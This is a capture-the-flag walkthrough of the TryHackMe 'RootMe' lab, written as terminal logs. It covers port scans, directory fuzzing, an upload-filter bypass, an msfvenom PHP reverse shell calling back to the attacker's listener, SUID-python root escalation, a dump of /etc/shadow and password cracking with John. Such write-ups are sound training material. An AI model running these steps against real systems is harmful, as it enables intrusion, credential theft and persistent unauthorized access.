https://tryhackme.com/room/rrootme

# Scanning for open ports

┌──(kali㉿kali)-[~/Downloads]
└─$ s`udo nmap 10.10.237.18 -sS`
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-07 10:32 EST
Nmap scan report for 10.10.237.18
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.03 seconds

# Scanning for services on ports 

┌──(kali㉿kali)-[~/Downloads]
└─$ `nmap 10.10.237.18 -p 80,22 -sC -sV`
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-07 10:32 EST
Nmap scan report for 10.10.237.18
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4ab9160884c25448ba5cfd3f225f2214 (RSA)
|   256 a9a686e8ec96c3f003cd16d54973d082 (ECDSA)
|_  256 22f6b5a654d9787c26035a95f3f9dfcd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.30 seconds

# Found Apache http server, lets do dir fuzzing

┌──(kali㉿kali)-[~/Downloads]
└─$ `gobuster -u http://10.10.237.18/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt dir`
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.237.18/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/panel                (Status: 301) [Size: 312] [--> http://10.10.237.18/panel/]
/uploads              (Status: 301) [Size: 314] [--> http://10.10.237.18/uploads/]
Progress: 7867 / 141709 (5.55%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 7897 / 141709 (5.57%)
===============================================================
Finished
===============================================================
        
# Found `File upload functionality` on /panel

# Checked on Headers, and we found PHP is being used

┌──(kali㉿kali)-[~/Downloads]
└─$ `whatweb http://10.10.237.18/ `      
http://10.10.237.18/ [200 OK] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.237.18], Script, Title[HackIT - Home]

# tried to upload sample php file, but server didnt allowed

# bypassed checks by changing `.php to .php5 or .phtml` since apache considers .php5 or .phtml also as .php

# Genrating reverseshell using msfvenom

`msfvenom -p php/reverse_php LHOST=10.17.107.227 LPORT=1234 -o shell.php`

# Uploading it and listeneing on port 1234

┌──(kali㉿kali)-[~/Downloads]
└─$ `nc -nlvp 1234`
listening on [any] 1234 ...
connect to [10.17.107.227] from (UNKNOWN) [10.10.237.18] 36238
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/bash
/bin/bash -i
python -c 'import pty;pty.spawn("/bin/bash")'
sudo -l                                   
find / -type f -perm -04000 -ls 2>/dev/null

# The revershell using msfvenom payload was very slow, so tried one from pentest monkey

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

┌──(kali㉿kali)-[~/Downloads]
└─$ `nc -nlvp 1234`
listening on [any] 1234 ...
connect to [10.17.107.227] from (UNKNOWN) [10.10.237.18] 36240
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 15:54:17 up  2:22,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
`/bin/bash -i`
bash: cannot set terminal process group (848): Inappropriate ioctl for device
bash: no job control in this shell
www-data@rootme:/$ `sudo -l`
sudo -l
sudo: no tty present and no askpass program specified
www-data@rootme:/$ `cat /etc/passwd`
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
rootme:x:1000:1000:RootMe:/home/rootme:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
test:x:1001:1001:,,,:/home/test:/bin/bash
www-data@rootme:/$ `cat /etc/shadow`
cat /etc/shadow
cat: /etc/shadow: Permission denied
www-data@rootme:/$ `cat /etc/crontab`
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

www-data@rootme:/$ `find / -type f -perm -4000 -ls 2>/dev/null`
find / -type f -perm -4000 -ls 2>/dev/null
   787696     44 -rwsr-xr--   1 root     messagebus    42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   787234    112 -rwsr-xr-x   1 root     root         113528 Jul 10  2020 /usr/lib/snapd/snap-confine
   918336    100 -rwsr-xr-x   1 root     root         100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
   787659     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
   787841    428 -rwsr-xr-x   1 root     root         436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
   787845     16 -rwsr-xr-x   1 root     root          14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
   787467     20 -rwsr-xr-x   1 root     root          18448 Jun 28  2019 /usr/bin/traceroute6.iputils
   787290     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newuidmap
   787288     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newgidmap
   787086     44 -rwsr-xr-x   1 root     root          44528 Mar 22  2019 /usr/bin/chsh
   266770   3580 -rwsr-sr-x   1 root     root        3665768 Aug  4  2020 /usr/bin/python
   787033     52 -rwsr-sr-x   1 daemon   daemon        51464 Feb 20  2018 /usr/bin/at
   787084     76 -rwsr-xr-x   1 root     root          76496 Mar 22  2019 /usr/bin/chfn
   787179     76 -rwsr-xr-x   1 root     root          75824 Mar 22  2019 /usr/bin/gpasswd
   787431    148 -rwsr-xr-x   1 root     root         149080 Jan 31  2020 /usr/bin/sudo
   787289     40 -rwsr-xr-x   1 root     root          40344 Mar 22  2019 /usr/bin/newgrp
   787306     60 -rwsr-xr-x   1 root     root          59640 Mar 22  2019 /usr/bin/passwd
   787326     24 -rwsr-xr-x   1 root     root          22520 Mar 27  2019 /usr/bin/pkexec
       66     40 -rwsr-xr-x   1 root     root          40152 Oct 10  2019 /snap/core/8268/bin/mount
       80     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /snap/core/8268/bin/ping
       81     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /snap/core/8268/bin/ping6
       98     40 -rwsr-xr-x   1 root     root          40128 Mar 25  2019 /snap/core/8268/bin/su
      116     27 -rwsr-xr-x   1 root     root          27608 Oct 10  2019 /snap/core/8268/bin/umount
     2665     71 -rwsr-xr-x   1 root     root          71824 Mar 25  2019 /snap/core/8268/usr/bin/chfn
     2667     40 -rwsr-xr-x   1 root     root          40432 Mar 25  2019 /snap/core/8268/usr/bin/chsh
     2743     74 -rwsr-xr-x   1 root     root          75304 Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
     2835     39 -rwsr-xr-x   1 root     root          39904 Mar 25  2019 /snap/core/8268/usr/bin/newgrp
     2848     53 -rwsr-xr-x   1 root     root          54256 Mar 25  2019 /snap/core/8268/usr/bin/passwd
     2958    134 -rwsr-xr-x   1 root     root         136808 Oct 11  2019 /snap/core/8268/usr/bin/sudo
     3057     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 10  2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     3427    419 -rwsr-xr-x   1 root     root              428240 Mar  4  2019 /snap/core/8268/usr/lib/openssh/ssh-keysign
     6462    105 -rwsr-sr-x   1 root     root              106696 Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine
     7636    386 -rwsr-xr--   1 root     dip               394984 Jun 12  2018 /snap/core/8268/usr/sbin/pppd
       66     40 -rwsr-xr-x   1 root     root               40152 Jan 27  2020 /snap/core/9665/bin/mount
       80     44 -rwsr-xr-x   1 root     root               44168 May  7  2014 /snap/core/9665/bin/ping
       81     44 -rwsr-xr-x   1 root     root               44680 May  7  2014 /snap/core/9665/bin/ping6
       98     40 -rwsr-xr-x   1 root     root               40128 Mar 25  2019 /snap/core/9665/bin/su
      116     27 -rwsr-xr-x   1 root     root               27608 Jan 27  2020 /snap/core/9665/bin/umount
     2605     71 -rwsr-xr-x   1 root     root               71824 Mar 25  2019 /snap/core/9665/usr/bin/chfn
     2607     40 -rwsr-xr-x   1 root     root               40432 Mar 25  2019 /snap/core/9665/usr/bin/chsh
     2683     74 -rwsr-xr-x   1 root     root               75304 Mar 25  2019 /snap/core/9665/usr/bin/gpasswd
     2775     39 -rwsr-xr-x   1 root     root               39904 Mar 25  2019 /snap/core/9665/usr/bin/newgrp
     2788     53 -rwsr-xr-x   1 root     root               54256 Mar 25  2019 /snap/core/9665/usr/bin/passwd
     2898    134 -rwsr-xr-x   1 root     root              136808 Jan 31  2020 /snap/core/9665/usr/bin/sudo
     2997     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     3367    419 -rwsr-xr-x   1 root     root              428240 May 26  2020 /snap/core/9665/usr/lib/openssh/ssh-keysign
     6405    109 -rwsr-xr-x   1 root     root              110656 Jul 10  2020 /snap/core/9665/usr/lib/snapd/snap-confine
     7582    386 -rwsr-xr--   1 root     dip               394984 Feb 11  2020 /snap/core/9665/usr/sbin/pppd
   786527     44 -rwsr-xr-x   1 root     root               43088 Jan  8  2020 /bin/mount
   786567     44 -rwsr-xr-x   1 root     root               44664 Mar 22  2019 /bin/su
   786500     32 -rwsr-xr-x   1 root     root               30800 Aug 11  2016 /bin/fusermount
   786551     64 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /bin/ping
   786585     28 -rwsr-xr-x   1 root     root               26696 Jan  8  2020 /bin/umount
www-data@rootme:/$ 

# We found `/usr/bin/python` with SUID permission, after checking on `GTFOBins` we found we can use it ot get root

https://gtfobins.github.io/gtfobins/python/#suid

www-data@rootme:/$ `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
`id`
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
`cat /etc/shadow`
root:$6$5osB44J2$24WV3zAR1FTqEq3f2kSqrigUgyDmKucU8rwHvbOJWxIoWSlHbVHV1Ug1eOHqidieZWDU3Y5V3cimChun2JYNw1:18478:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
rootme:$6$jzeDDmrVeqMMEQqv$j8jwWy951YwWBJWzQNn.A45I.8H06/QOv4qocX.hNDdT42NytyavSHxlxoEh0ek2OS4NX27tuuZRTJuHPSWCp.:18478:0:99999:7:::
sshd:*:18478:0:99999:7:::
test:$6$vXOyvOWZ$UpIjnJq/KuKmKHezW/pEM.nrI6QuqhWWlv/fUmLvJI1YG7nju2vpP3vg1Q0SSf5FCk8058WD5Rc3XXPMRlqHb0:18478:0:99999:7:::

# We can further use `John` to crack the password

┌──(kali㉿kali)-[~/Downloads]
└─$ `nano shadow.txt `         
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ `nano passwd.txt`
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ `unshadow passwd.txt shadow.txt > crackme.txt`
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ `john --wordlist=/home/kali/rockyou.txt crackme.txt`
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123      (root)   
test             (test)    
1g 0:00:03:48 0.32% (ETA: 06:16:05) 0.004374g/s 240.7p/s 628.1c/s 628.1C/s marichuy..grad2010
Use the "--show" option to display all of the cracked passwords reliably
Session aborted


# Now we can directly SSH into server whenenever we want to root or  test user

──(kali㉿kali)-[~]
└─$ `ssh test@10.10.237.18  `                             
test@10.10.237.18's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Feb  7 16:16:53 UTC 2024

  System load:  0.0                Processes:           116
  Usage of /:   20.4% of 19.56GB   Users logged in:     0
  Memory usage: 67%                IP address for eth0: 10.10.237.18
  Swap usage:   0%


55 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

test@rootme:~$ `id`
uid=1001(test) gid=1001(test) groups=1001(test)
test@rootme:~$ 
